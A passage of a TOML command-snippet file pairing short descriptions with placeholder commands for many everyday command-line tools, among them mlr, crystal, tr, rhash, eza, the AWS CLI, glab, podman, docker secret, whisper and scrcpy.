  description = "Receive JSON and format the output as vertical JSON"
  command = "echo '{""hello"":""world"", ""foo"":""bar""}' | mlr --ijson --ojson --jvstack cat"
  output = ""

[[snippets]]
  description = "Filter lines of a compressed CSV file treating numbers as strings"
  command = "mlr --prepipe 'gunzip' --csv filter -S '$<fieldName> =~ ""<regular_expression>""' <example.csv.gz>"
  output = ""

[[snippets]]
  description = "Run a Crystal file"
  command = "crystal <path/to/file.cr>"
  output = ""

[[snippets]]
  description = "Compile a file and all dependencies to a single executable"
  command = "crystal build <path/to/file.cr>"
  output = ""

[[snippets]]
  description = "Read Crystal source code from the command line or `stdin`, and execute it"
  command = "crystal eval '<code>'"
  output = ""

[[snippets]]
  description = "Generate API documentation from inline docstrings in Crystal files"
  command = "crystal docs"
  output = ""

[[snippets]]
  description = "Compile and run a Crystal specification suite"
  command = "crystal spec"
  output = ""

[[snippets]]
  description = "Start a local interactive server for testing the language"
  command = "crystal play"
  output = ""

[[snippets]]
  description = "Create a project directory for a Crystal application"
  command = "crystal init app <application_name>"
  output = ""

[[snippets]]
  description = "Display all help options"
  command = "crystal help"
  output = ""

[[snippets]]
  description = "Search for a pattern within a ZIP archive"
  command = "zipgrep ""<search_pattern>"" <path/to/file.zip>"
  output = ""

[[snippets]]
  description = "Print file name and line number for each match"
  command = "zipgrep -H -n ""<search_pattern>"" <path/to/file.zip>"
  output = ""

[[snippets]]
  description = "Search for lines that do not match a pattern"
  command = "zipgrep -v ""<search_pattern>"" <path/to/file.zip>"
  output = ""

[[snippets]]
  description = "Specify files inside a ZIP archive from search"
  command = "zipgrep ""<search_pattern>"" <path/to/file.zip> <file/to/search1> <file/to/search2>"
  output = ""

[[snippets]]
  description = "Exclude files inside a ZIP archive from search"
  command = "zipgrep ""<search_pattern>"" <path/to/file.zip> -x <file/to/exclude1> <file/to/exclude2>"
  output = ""

[[snippets]]
  description = "Run without splash screen during startup"
  command = "matlab -nosplash"
  output = ""

[[snippets]]
  description = "Execute a MATLAB statement"
  command = "matlab -r ""<matlab_statement>"""
  output = ""

[[snippets]]
  description = "Run a MATLAB script"
  command = "matlab -r ""run(<path/to/script.m>)"""
  output = ""

[[snippets]]
  description = "Check the current directory"
  command = "mh_lint"
  output = ""

[[snippets]]
  description = "Check a specific directory recursively"
  command = "mh_lint <path/to/directory>"
  output = ""

[[snippets]]
  description = "Check a MATLAB file"
  command = "mh_lint <path/to/file.m>"
  output = ""

[[snippets]]
  description = "Check an Octave file"
  command = "mh_lint --octave <path/to/file.m>"
  output = ""

[[snippets]]
  description = "Show why a Yarn package is installed"
  command = "yarn-why <package>"
  output = ""

[[snippets]]
  description = "Show the difference between traceroutes in two `warts` files"
  command = "sc_tracediff <path/to/file1.warts> <path/to/file2.warts>"
  output = ""

[[snippets]]
  description = "Show the difference between the traceroutes in two `warts` files, including those that have not changed"
  command = "sc_tracediff -a <path/to/file1.warts> <path/to/file2.warts>"
  output = ""

[[snippets]]
  description = "Show the difference between the traceroutes in two `warts` files and try to show DNS names and not IP addresses if possible"
  command = "sc_tracediff -n <path/to/file1.warts> <path/to/file2.warts>"
  output = ""

[[snippets]]
  description = "Replace all occurrences of a character in a file, and print the result"
  command = "tr <find_character> <replace_character> < <path/to/file>"
  output = ""

[[snippets]]
  description = "Replace all occurrences of a character from another command's output"
  command = "echo <text> | tr <find_character> <replace_character>"
  output = ""

[[snippets]]
  description = "Map each character of the first set to the corresponding character of the second set"
  command = "tr '<abcd>' '<jkmn>' < <path/to/file>"
  output = ""

[[snippets]]
  description = "Delete all occurrences of the specified set of characters from the input"
  command = "tr -d '<input_characters>' < <path/to/file>"
  output = ""

[[snippets]]
  description = "Compress a series of identical characters to a single character"
  command = "tr -s '<input_characters>' < <path/to/file>"
  output = ""

[[snippets]]
  description = "Translate the contents of a file to upper-case"
  command = "tr ""[:lower:]"" ""[:upper:]"" < <path/to/file>"
  output = ""

[[snippets]]
  description = "Strip out non-printable characters from a file"
  command = "tr -cd ""[:print:]"" < <path/to/file>"
  output = ""

[[snippets]]
  description = "Calculate default CRC32 digests of a file"
  command = "rhash <path/to/file>"
  output = ""

[[snippets]]
  description = "Recursively process a directory to generate an SFV file using SHA1"
  command = "rhash --sha1 --recursive <path/to/folder> > <path/to/output.sfv>"
  output = ""

[[snippets]]
  description = "Verify the integrity of files based on an SFV file"
  command = "rhash --check <path/to/file.sfv>"
  output = ""

[[snippets]]
  description = "Calculate the SHA3 digest of a text message"
  command = "rhash --sha3-256 --message '<message>'"
  output = ""

[[snippets]]
  description = "Calculate CRC32 digest of a file and output digest encoded in base64 using BSD format"
  command = "rhash --base64 --bsd <path/to/file>"
  output = ""

[[snippets]]
  description = "Use custom output template"
  command = "rhash --printf '<%p\t%s\t%{mtime}\t%m\n>' <path/to/file>"
  output = ""

[[snippets]]
  description = "List files one per line"
  command = "eza --oneline"
  output = ""

[[snippets]]
  description = "List all files, including hidden files"
  command = "eza --all"
  output = ""

[[snippets]]
  description = "Long format list (permissions, ownership, size and modification date) of all files"
  command = "eza --long --all"
  output = ""

[[snippets]]
  description = "List files with the largest at the top"
  command = "eza --reverse --sort=<size>"
  output = ""

[[snippets]]
  description = "Display a tree of files, three levels deep"
  command = "eza --long --tree --level=<3>"
  output = ""

[[snippets]]
  description = "List files sorted by modification date (oldest first)"
  command = "eza --long --sort=<modified>"
  output = ""

[[snippets]]
  description = "List files with their headers, icons, and Git statuses"
  command = "eza --long --header --icons --git"
  output = ""

[[snippets]]
  description = "Don't list files mentioned in `.gitignore`"
  command = "eza --git-ignore"
  output = ""

[[snippets]]
  description = "Generate a default template configuration file `Doxyfile`"
  command = "doxygen -g"
  output = ""

[[snippets]]
  description = "Generate a template configuration file"
  command = "doxygen -g <path/to/config_file>"
  output = ""

[[snippets]]
  description = "Generate documentation using an existing configuration file"
  command = "doxygen <path/to/config_file>"
  output = ""

[[snippets]]
  description = "Search for an exact string in a file"
  command = "zfgrep <search_string> <path/to/file>"
  output = ""

[[snippets]]
  description = "Count the number of lines that match the given string in a file"
  command = "zfgrep --count <search_string> <path/to/file>"
  output = ""

[[snippets]]
  description = "Show the line number in the file along with the matching lines"
  command = "zfgrep --line-number <search_string> <path/to/file>"
  output = ""

[[snippets]]
  description = "Display all lines except those that contain the search string"
  command = "zfgrep --invert-match <search_string> <path/to/file>"
  output = ""

[[snippets]]
  description = "List only filenames whose content matches the search string at least once"
  command = "zfgrep --files-with-matches <search_string> <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Start the video editor"
  command = "kdenlive"
  output = ""

[[snippets]]
  description = "Open a specific file"
  command = "kdenlive <path/to/file.kdenlive>"
  output = ""

[[snippets]]
  description = "Use a specific path for an MLT environment"
  command = "kdenlive --mlt-path <path/to/directory>"
  output = ""

[[snippets]]
  description = "Use a specific log level for an MLT environment"
  command = "kdenlive --mlt-log <verbose|debug>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "kdenlive --help"
  output = ""

[[snippets]]
  description = "Display version"
  command = "kdenlive --version"
  output = ""

[[snippets]]
  description = "Concatenate specific files in reversed order"
  command = "tac <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Display `stdin` in reversed order"
  command = "<cat path/to/file> | tac"
  output = ""

[[snippets]]
  description = "Use a specific [s]eparator"
  command = "tac -s <separator> <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Use a specific [r]egex as a [s]eparator"
  command = "tac -r -s <separator> <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Use a separator [b]efore each file"
  command = "tac -b <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Create an EKS Cluster"
  command = "aws eks create-cluster --name <cluster_name> --role-arn <eks_service_role_arn> --resources-vpc-config <subnetIds=<subnet_ids>,securityGroupIds=<security_group_ids>>"
  output = ""

[[snippets]]
  description = "Update kubeconfig to connect to the EKS Cluster"
  command = "aws eks update-kubeconfig --name <cluster_name>"
  output = ""

[[snippets]]
  description = "List available EKS clusters"
  command = "aws eks list-clusters"
  output = ""

[[snippets]]
  description = "Describe EKS cluster details"
  command = "aws eks describe-cluster --name <cluster_name>"
  output = ""

[[snippets]]
  description = "Delete an EKS Cluster"
  command = "aws eks delete-cluster --name <cluster_name>"
  output = ""

[[snippets]]
  description = "List nodegroups in an EKS cluster"
  command = "aws eks list-nodegroups --cluster-name <cluster_name>"
  output = ""

[[snippets]]
  description = "Describe nodegroup details"
  command = "aws eks describe-nodegroup --cluster-name <cluster_name> --nodegroup-name <nodegroup_name>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr clj"
  output = ""

[[snippets]]
  description = "Create a merge request"
  command = "glab mr create"
  output = ""

[[snippets]]
  description = "Check out a specific merge request locally"
  command = "glab mr checkout <mr_number>"
  output = ""

[[snippets]]
  description = "View the changes made in the merge request"
  command = "glab mr diff"
  output = ""

[[snippets]]
  description = "Approve the merge request for the current branch"
  command = "glab mr approve"
  output = ""

[[snippets]]
  description = "Merge the merge request associated with the current branch interactively"
  command = "glab mr merge"
  output = ""

[[snippets]]
  description = "Edit a merge request interactively"
  command = "glab mr update"
  output = ""

[[snippets]]
  description = "Edit the target branch of a merge request"
  command = "glab mr update --target-branch <branch_name>"
  output = ""

[[snippets]]
  description = "Process a specific directory"
  command = "rector process <path/to/directory>"
  output = ""

[[snippets]]
  description = "Process a directory without applying changes (dry run)"
  command = "rector process <path/to/directory> --dry-run"
  output = ""

[[snippets]]
  description = "Process a directory and apply coding standards"
  command = "rector process <path/to/directory> --with-style"
  output = ""

[[snippets]]
  description = "Display a list of available levels"
  command = "rector levels"
  output = ""

[[snippets]]
  description = "Process a directory with a specific level"
  command = "rector process <path/to/directory> --level <level_name>"
  output = ""

[[snippets]]
  description = "Convert a PPM image to a MITSU file"
  command = "ppmtomitsu <path/to/file.ppm> > <path/to/file.mitsu>"
  output = ""

[[snippets]]
  description = "Enlarge the image by the specified factor, use the specified sharpness and produce `n` copies"
  command = "ppmtomitsu -enlarge <1|2|3> -sharpness <1|2|3|4> -copy <n> <path/to/file.ppm> > <path/to/file.mitsu>"
  output = ""

[[snippets]]
  description = "Use the given medium for the printing process"
  command = "ppmtomitsu -media <A|A4|AS|A4S> <path/to/file.ppm> > <path/to/file.mitsu>"
  output = ""

[[snippets]]
  description = "Display remote locations, remote and local branches, most recent commit data and `.git/config` settings"
  command = "git info"
  output = ""

[[snippets]]
  description = "Display remote locations, remote and local branches and most recent commit data"
  command = "git info --no-config"
  output = ""

[[snippets]]
  description = "Change the Node.js install location to a specified directory (`ps-nvm` will create a new `.nvm` subdirectory to install them)"
  command = "Set-NodeInstallLocation <path/to/directory>"
  output = ""

[[snippets]]
  description = "Remove the specified file if it is the last link"
  command = "unlink <path/to/file>"
  output = ""

[[snippets]]
  description = "Search for extended regular expressions (supporting `?`, `+`, `{}`, `()` and `|`) in a compressed file (case-sensitive)"
  command = "bzegrep ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Search for extended regular expressions (supporting `?`, `+`, `{}`, `()` and `|`) in a compressed file (case-insensitive)"
  command = "bzegrep --ignore-case ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Search for lines that do not match a pattern"
  command = "bzegrep --invert-match ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Print file name and line number for each match"
  command = "bzegrep --with-filename --line-number ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Search for lines matching a pattern, printing only the matched text"
  command = "bzegrep --only-matching ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Recursively search files in a `bzip2` compressed `tar` archive for a pattern"
  command = "bzegrep --recursive ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Open a `zstd` compressed file"
  command = "zstdless <path/to/file.zst>"
  output = ""

[[snippets]]
  description = "Find all instances of a command"
  command = "where <command>"
  output = ""

[[snippets]]
  description = "Convert to UTF-8 encoding"
  command = "nkf -w <path/to/file.txt>"
  output = ""

[[snippets]]
  description = "Convert to SHIFT_JIS encoding"
  command = "nkf -s <path/to/file.txt>"
  output = ""

[[snippets]]
  description = "Convert to UTF-8 encoding and overwrite the file"
  command = "nkf -w --overwrite <path/to/file.txt>"
  output = ""

[[snippets]]
  description = "Use LF as the new line code and overwrite (UNIX type)"
  command = "nkf -d --overwrite <path/to/file.txt>"
  output = ""

[[snippets]]
  description = "Use CRLF as the new line code and overwrite (windows type)"
  command = "nkf -c --overwrite <path/to/file.txt>"
  output = ""

[[snippets]]
  description = "Decrypt mime file and overwrite"
  command = "nkf -m --overwrite <path/to/file.txt>"
  output = ""

[[snippets]]
  description = "List VMs"
  command = "limactl list"
  output = ""

[[snippets]]
  description = "Create a VM using the default settings and optionally provide a name and/or a template (see `limactl create --list-templates` for available templates)"
  command = "limactl create --name <vm_name> template://<debian|fedora|ubuntu|…>"
  output = ""

[[snippets]]
  description = "Start a VM (this might install some dependencies in it and take a few minutes)"
  command = "limactl start <vm_name>"
  output = ""

[[snippets]]
  description = "Open a remote shell inside a VM"
  command = "limactl shell <vm_name>"
  output = ""

[[snippets]]
  description = "Run a command inside a VM"
  command = "limactl shell <vm_name> <command>"
  output = ""

[[snippets]]
  description = "Stop/shutdown a VM"
  command = "limactl stop <vm_name>"
  output = ""

[[snippets]]
  description = "Delete a VM"
  command = "limactl remove <vm_name>"
  output = ""

[[snippets]]
  description = "List currently running docker machines"
  command = "docker-machine ls"
  output = ""

[[snippets]]
  description = "Create a new docker machine with specific name"
  command = "docker-machine create <name>"
  output = ""

[[snippets]]
  description = "Get the status of a machine"
  command = "docker-machine status <name>"
  output = ""

[[snippets]]
  description = "Start a machine"
  command = "docker-machine start <name>"
  output = ""

[[snippets]]
  description = "Stop a machine"
  command = "docker-machine stop <name>"
  output = ""

[[snippets]]
  description = "Inspect information about a machine"
  command = "docker-machine inspect <name>"
  output = ""

[[snippets]]
  description = "Show all streams in the account"
  command = "aws kinesis list-streams"
  output = ""

[[snippets]]
  description = "Write one record to a Kinesis stream"
  command = "aws kinesis put-record --stream-name <name> --partition-key <key> --data <base64_encoded_message>"
  output = ""

[[snippets]]
  description = "Write a record to a Kinesis stream with inline base64 encoding"
  command = "aws kinesis put-record --stream-name <name> --partition-key <key> --data ""$( echo ""<my raw message>"" | base64 )"""
  output = ""

[[snippets]]
  description = "List the shards available on a stream"
  command = "aws kinesis list-shards --stream-name <name>"
  output = ""

[[snippets]]
  description = "Get a shard iterator for reading from the oldest message in a stream's shard"
  command = "aws kinesis get-shard-iterator --shard-iterator-type TRIM_HORIZON --stream-name <name> --shard-id <id>"
  output = ""

[[snippets]]
  description = "Read records from a shard, using a shard iterator"
  command = "aws kinesis get-records --shard-iterator <iterator>"
  output = ""

[[snippets]]
  description = "Prompt for an otpauth URI token and create a new pass file"
  command = "pass otp insert <path/to/pass>"
  output = ""

[[snippets]]
  description = "Prompt for an otpauth URI token and append to an existing pass file"
  command = "pass otp append <path/to/pass>"
  output = ""

[[snippets]]
  description = "Print a 2FA code using the OTP token in a pass file"
  command = "pass otp <path/to/pass>"
  output = ""

[[snippets]]
  description = "Copy and don't print a 2FA code using the OTP token in a pass file"
  command = "pass otp --clip <path/to/pass>"
  output = ""

[[snippets]]
  description = "Display a QR code using the OTP token stored in a pass file"
  command = "pass otp uri --qrcode <path/to/pass>"
  output = ""

[[snippets]]
  description = "Prompt for an OTP secret value specifying issuer and account (at least one must be specified) and append to existing pass file"
  command = "pass otp append --secret --issuer <issuer_name> --account <account_name> <path/to/pass>"
  output = ""

[[snippets]]
  description = "Set the `fuck` alias to `thefuck` tool"
  command = "eval ""$(thefuck --alias)"""
  output = ""

[[snippets]]
  description = "Try to match a rule for the previous command"
  command = "fuck"
  output = ""

[[snippets]]
  description = "Confirm the first choice immediately (correct argument depends on level of annoyance)"
  command = "fuck --<yes|yeah|hard>"
  output = ""

[[snippets]]
  description = "Run a speed test"
  command = "speedtest-cli"
  output = ""

[[snippets]]
  description = "Run a speed test and display values in bytes, instead of bits"
  command = "speedtest-cli --bytes"
  output = ""

[[snippets]]
  description = "Run a speed test using `HTTPS`, instead of `HTTP`"
  command = "speedtest-cli --secure"
  output = ""

[[snippets]]
  description = "Run a speed test without performing download tests"
  command = "speedtest-cli --no-download"
  output = ""

[[snippets]]
  description = "Run a speed test and generate an image of the results"
  command = "speedtest-cli --share"
  output = ""

[[snippets]]
  description = "List all `speedtest.net` servers, sorted by distance"
  command = "speedtest-cli --list"
  output = ""

[[snippets]]
  description = "Run a speed test to a specific speedtest.net server"
  command = "speedtest-cli --server <server_id>"
  output = ""

[[snippets]]
  description = "Run a speed test and display the results as JSON (suppresses progress information)"
  command = "speedtest-cli --json"
  output = ""

[[snippets]]
  description = "Run a meteor project from its root directory in development mode"
  command = "meteor"
  output = ""

[[snippets]]
  description = "Create a project under the given directory"
  command = "meteor create <path/to/directory>"
  output = ""

[[snippets]]
  description = "Display the list of packages the project is currently using"
  command = "meteor list"
  output = ""

[[snippets]]
  description = "Add a package to the project"
  command = "meteor add <package>"
  output = ""

[[snippets]]
  description = "Remove a package from the project"
  command = "meteor remove <package>"
  output = ""

[[snippets]]
  description = "Create a production build of the project as a tarball under the given directory"
  command = "meteor build <path/to/directory>"
  output = ""

[[snippets]]
  description = "Download a URL to a file"
  command = "http --download <example.org>"
  output = ""

[[snippets]]
  description = "Send form-encoded data"
  command = "http --form <example.org> <name='bob'> <profile_picture@'bob.png'>"
  output = ""

[[snippets]]
  description = "Send JSON object"
  command = "http <example.org> <name='bob'>"
  output = ""

[[snippets]]
  description = "Specify an HTTP method"
  command = "http <HEAD> <example.org>"
  output = ""

[[snippets]]
  description = "Include an extra header"
  command = "http <example.org> <X-MyHeader:123>"
  output = ""

[[snippets]]
  description = "Pass a username and password for server authentication"
  command = "http --auth <username:password> <example.org>"
  output = ""

[[snippets]]
  description = "Specify raw request body via `stdin`"
  command = "cat <data.txt> | http PUT <example.org>"
  output = ""

[[snippets]]
  description = "List all performed enumerations in the database"
  command = "amass db -dir <path/to/database_directory> -list"
  output = ""

[[snippets]]
  description = "Show results for a specified enumeration index and [d]omain name"
  command = "amass db -dir <path/to/database_directory> -d <domain_name> -enum <index_from_list> -show"
  output = ""

[[snippets]]
  description = "List all found subdomains of a [d]omain within an enumeration"
  command = "amass db -dir <path/to/database_directory> -d <domain_name> -enum <index_from_list> -names"
  output = ""

[[snippets]]
  description = "Show a summary of the found subdomains within an enumeration"
  command = "amass db -dir <path/to/database_directory> -d <domain_name> -enum <index_from_list> -summary"
  output = ""

[[snippets]]
  description = "Remove a file or directory from Fossil version control"
  command = "fossil rm <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Remove a file or directory from Fossil version control, and also delete it from the disk"
  command = "fossil rm --hard <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Re-add all previously removed and uncommitted files to Fossil version control"
  command = "fossil rm --reset"
  output = ""

[[snippets]]
  description = "Describe the specified Netpbm files"
  command = "pamfile <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Describe every image in each input file (as opposed to only the first image in each file) in a machine-readable format"
  command = "pamfile -allimages -machine <path/to/file>"
  output = ""

[[snippets]]
  description = "Display a count on how many images the input files contain"
  command = "pamfile -count <path/to/file>"
  output = ""

[[snippets]]
  description = "Start daemon in the background"
  command = "sshd"
  output = ""

[[snippets]]
  description = "Run sshd in the foreground"
  command = "sshd -D"
  output = ""

[[snippets]]
  description = "Run with verbose output (for debugging)"
  command = "sshd -D -d"
  output = ""

[[snippets]]
  description = "Run on a specific port"
  command = "sshd -p <port>"
  output = ""

[[snippets]]
  description = "Create a new secret from `stdin`"
  command = "<command> | docker secret create <secret_name> -"
  output = ""

[[snippets]]
  description = "Create a new secret from a file"
  command = "docker secret create <secret_name> <path/to/file>"
  output = ""

[[snippets]]
  description = "List all secrets"
  command = "docker secret ls"
  output = ""

[[snippets]]
  description = "Display detailed information on one or multiple secrets in a human friendly format"
  command = "docker secret inspect --pretty <secret_name1 secret_name2 ...>"
  output = ""

[[snippets]]
  description = "Remove one or more secrets"
  command = "docker secret rm <secret_name1 secret_name2 ...>"
  output = ""

[[snippets]]
  description = "Build the storage pool specified by name or UUID (determine using `virsh pool-list`)"
  command = "virsh pool-build --pool <name|uuid>"
  output = ""

[[snippets]]
  description = "Generate an auto login link for the admin user and print it"
  command = "plesk login"
  output = ""

[[snippets]]
  description = "Show product version information"
  command = "plesk version"
  output = ""

[[snippets]]
  description = "List all hosted domains"
  command = "plesk bin domain --list"
  output = ""

[[snippets]]
  description = "Start watching for changes in the `panel.log` file"
  command = "plesk log <panel.log>"
  output = ""

[[snippets]]
  description = "Start the interactive MySQL console"
  command = "plesk db"
  output = ""

[[snippets]]
  description = "Open the Plesk main configuration file in the default editor"
  command = "plesk conf <panel.ini>"
  output = ""

[[snippets]]
  description = "Convert a specific audio file to all of the given file formats"
  command = "whisper <path/to/audio.mp3>"
  output = ""

[[snippets]]
  description = "Convert an audio file specifying the output format of the converted file"
  command = "whisper <path/to/audio.mp3> --output_format <txt>"
  output = ""

[[snippets]]
  description = "Convert an audio file using a specific model for conversion"
  command = "whisper <path/to/audio.mp3> --model <tiny.en,tiny,base.en,base,small.en,small,medium.en,medium,large-v1,large-v2,large>"
  output = ""

[[snippets]]
  description = "Convert an audio file specifying which language the audio file is in to reduce conversion time"
  command = "whisper <path/to/audio.mp3> --language <english>"
  output = ""

[[snippets]]
  description = "Convert an audio file and save it to a specific location"
  command = "whisper <path/to/audio.mp3> --output_dir ""<path/to/output>"""
  output = ""

[[snippets]]
  description = "Convert an audio file in quiet mode"
  command = "whisper <path/to/audio.mp3> --verbose <False>"
  output = ""

[[snippets]]
  description = "Create a new project"
  command = "gcloud projects create <project_id|project_number>"
  output = ""

[[snippets]]
  description = "List all active projects"
  command = "gcloud projects list"
  output = ""

[[snippets]]
  description = "Display metadata for a project"
  command = "gcloud projects describe <project_id>"
  output = ""

[[snippets]]
  description = "Delete a project"
  command = "gcloud projects delete <project_id|project_number>"
  output = ""

[[snippets]]
  description = "Add an IAM policy binding to a specified project"
  command = "gcloud projects add-iam-policy-binding <project_id> --member <principal> --role <role>"
  output = ""

[[snippets]]
  description = "Run command in a new container from a tagged image"
  command = "podman run <image:tag> <command>"
  output = ""

[[snippets]]
  description = "Run command in a new container in background and display its ID"
  command = "podman run --detach <image:tag> <command>"
  output = ""

[[snippets]]
  description = "Run command in a one-off container in interactive mode and pseudo-TTY"
  command = "podman run --rm --interactive --tty <image:tag> <command>"
  output = ""

[[snippets]]
  description = "Run command in a new container with passed environment variables"
  command = "podman run --env '<variable>=<value>' --env <variable> <image:tag> <command>"
  output = ""

[[snippets]]
  description = "Run command in a new container with bind mounted volumes"
  command = "podman run --volume </path/to/host_path>:</path/to/container_path> <image:tag> <command>"
  output = ""

[[snippets]]
  description = "Run command in a new container with published ports"
  command = "podman run --publish <host_port>:<container_port> <image:tag> <command>"
  output = ""

[[snippets]]
  description = "Run command in a new container overwriting the entrypoint of the image"
  command = "podman run --entrypoint <command> <image:tag>"
  output = ""

[[snippets]]
  description = "Run command in a new container connecting it to a network"
  command = "podman run --network <network> <image:tag>"
  output = ""

[[snippets]]
  description = "Checkout the latest version of all target files and directories"
  command = "dvc checkout"
  output = ""

[[snippets]]
  description = "Checkout the latest version of a specified target"
  command = "dvc checkout <target>"
  output = ""

[[snippets]]
  description = "Checkout a specific version of a target from a different Git commit/tag/branch"
  command = "git checkout <commit_hash|tag|branch> <target> && dvc checkout <target>"
  output = ""

[[snippets]]
  description = "List all aliases"
  command = "git alias"
  output = ""

[[snippets]]
  description = "Create a new alias"
  command = "git alias ""<name>"" ""<command>"""
  output = ""

[[snippets]]
  description = "Search for an existing alias"
  command = "git alias ^<name>"
  output = ""

[[snippets]]
  description = "Apply the Rules of Life to an input PBM image file for one generation and the output the result as a PBM image file"
  command = "pbmlife <path/to/file.pbm>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "pbmlife -version"
  output = ""

[[snippets]]
  description = "Display information about a Matroska file"
  command = "mkvmerge --identify <path/to/file.mkv>"
  output = ""

[[snippets]]
  description = "Extract the audio from track 1 of a specific file"
  command = "mkvextract tracks <path/to/file.mkv> <1>:<path/to/output.webm>"
  output = ""

[[snippets]]
  description = "Extract the subtitle from track 3 of a specific file"
  command = "mkvextract tracks <path/to/file.mkv> <3>:<path/to/subs.srt>"
  output = ""

[[snippets]]
  description = "Add a subtitle track to a file"
  command = "mkvmerge --output <path/to/output.mkv> <path/to/file.mkv> <path/to/subs.srt>"
  output = ""

[[snippets]]
  description = "Delete merged branches"
  command = "git delete-merged-branches"
  output = ""

[[snippets]]
  description = "Name a hash"
  command = "nth -t <5f4dcc3b5aa765d61d8327deb882cf99>"
  output = ""

[[snippets]]
  description = "Name hashes in a file"
  command = "nth -f <path/to/hashes>"
  output = ""

[[snippets]]
  description = "Print in JSON format"
  command = "nth -t <5f4dcc3b5aa765d61d8327deb882cf99> -g"
  output = ""

[[snippets]]
  description = "Decode hash in Base64 before naming it"
  command = "nth -t <NWY0ZGNjM2I1YWE3NjVkNjFkODMyN2RlYjg4MmNmOTkK> -b64"
  output = ""

[[snippets]]
  description = "Sort a file in ascending order"
  command = "sort <path/to/file>"
  output = ""

[[snippets]]
  description = "Sort a file in descending order"
  command = "sort --reverse <path/to/file>"
  output = ""

[[snippets]]
  description = "Sort a file in case-insensitive way"
  command = "sort --ignore-case <path/to/file>"
  output = ""

[[snippets]]
  description = "Sort a file using numeric rather than alphabetic order"
  command = "sort --numeric-sort <path/to/file>"
  output = ""

[[snippets]]
  description = "Sort `/etc/passwd` by the 3rd field of each line numerically, using ":" as a field separator"
  command = "sort --field-separator=<:> --key=<3n> </etc/passwd>"
  output = ""

[[snippets]]
  description = "Sort a file preserving only unique lines"
  command = "sort --unique <path/to/file>"
  output = ""

[[snippets]]
  description = "Sort a file, printing the output to the specified output file (can be used to sort a file in-place)"
  command = "sort --output=<path/to/file> <path/to/file>"
  output = ""

[[snippets]]
  description = "Sort numbers with exponents"
  command = "sort --general-numeric-sort <path/to/file>"
  output = ""

[[snippets]]
  description = "List out system information, with either default settings or those specified in your configuration file"
  command = "macchina"
  output = ""

[[snippets]]
  description = "Specify a custom configuration file path"
  command = "macchina --config <path/to/configuration_file>"
  output = ""

[[snippets]]
  description = "List system information, but lengthen uptime, shell and kernel output"
  command = "macchina --long-uptime --long-shell --long-kernel"
  output = ""

[[snippets]]
  description = "Check for any errors/system failures encountered when trying to fetch system information"
  command = "macchina --doctor"
  output = ""

[[snippets]]
  description = "List original artists of all the ASCII art"
  command = "macchina --ascii-artists"
  output = ""

[[snippets]]
  description = "Run a CPU benchmark with 1 thread for 10 seconds"
  command = "sysbench cpu run"
  output = ""

[[snippets]]
  description = "Run a CPU benchmark with multiple threads for a specified time"
  command = "sysbench --threads=<number_of_threads> --time=<seconds>"
  output = ""

[[snippets]]
  description = "Run a memory benchmark with 1 thread for 10 seconds"
  command = "sysbench memory run"
  output = ""

[[snippets]]
  description = "Prepare a filesystem-level read benchmark"
  command = "sysbench fileio prepare"
  output = ""

[[snippets]]
  description = "Run a filesystem-level benchmark"
  command = "sysbench --file-test-mode=<rndrd|rndrw|rndwr|seqrd|seqrewr|seqwr> fileio run"
  output = ""

[[snippets]]
  description = "View documentation for the current package"
  command = "go doc"
  output = ""

[[snippets]]
  description = "Show package documentation and exported symbols"
  command = "go doc <encoding/json>"
  output = ""

[[snippets]]
  description = "Show also documentation of symbols"
  command = "go doc -all <encoding/json>"
  output = ""

[[snippets]]
  description = "Show also sources"
  command = "go doc -all -src <encoding/json>"
  output = ""

[[snippets]]
  description = "Show a specific symbol"
  command = "go doc -all -src <encoding/json.Number>"
  output = ""

[[snippets]]
  description = "Display all bookmarks matching "keyword" and with "privacy" tag"
  command = "buku <keyword> --stag <privacy>"
  output = ""

[[snippets]]
  description = "Add bookmark with tags "search engine" and "privacy""
  command = "buku --add <https://example.com> <search engine>, <privacy>"
  output = ""

[[snippets]]
  description = "Delete a bookmark"
  command = "buku --delete <bookmark_id>"
  output = ""

[[snippets]]
  description = "Open editor to edit a bookmark"
  command = "buku --write <bookmark_id>"
  output = ""

[[snippets]]
  description = "Remove "search engine" tag from a bookmark"
  command = "buku --update <bookmark_id> --tag <-> <search engine>"
  output = ""

[[snippets]]
  description = "Clone a GitLab repository locally"
  command = "glab repo clone <owner>/<repository>"
  output = ""

[[snippets]]
  description = "Create a new issue"
  command = "glab issue create"
  output = ""

[[snippets]]
  description = "View and filter the open issues of the current repository"
  command = "glab issue list"
  output = ""

[[snippets]]
  description = "View an issue in the default browser"
  command = "glab issue view --web <issue_number>"
  output = ""

[[snippets]]
  description = "Create a merge request"
  command = "glab mr create"
  output = ""

[[snippets]]
  description = "View a pull request in the default web browser"
  command = "glab mr view --web <pr_number>"
  output = ""

[[snippets]]
  description = "Check out a specific pull request locally"
  command = "glab mr checkout <pr_number>"
  output = ""

[[snippets]]
  description = "Display a mirror of a connected device"
  command = "scrcpy"
  output = ""

[[snippets]]
  description = "Display a mirror of a specific device based on its ID or IP address (find it under the `adb devices` command)"
  command = "scrcpy --serial <0123456789abcdef|192.168.0.1:5555>"
  output = ""

[[snippets]]
  description = "Start display in fullscreen mode"
  command = "scrcpy --fullscreen"
  output = ""

[[snippets]]
  description = "Rotate the display screen. Each incremental value adds a 90 degree counterclockwise rotation"
  command = "scrcpy --rotation <0|1|2|3>"
  output = ""

[[snippets]]
  description = "Show touches on physical device"
  command = "scrcpy --show-touches"
  output = ""

[[snippets]]
  description = "Record display screen"
  command = "scrcpy --record <path/to/file.mp4>"
  output = ""

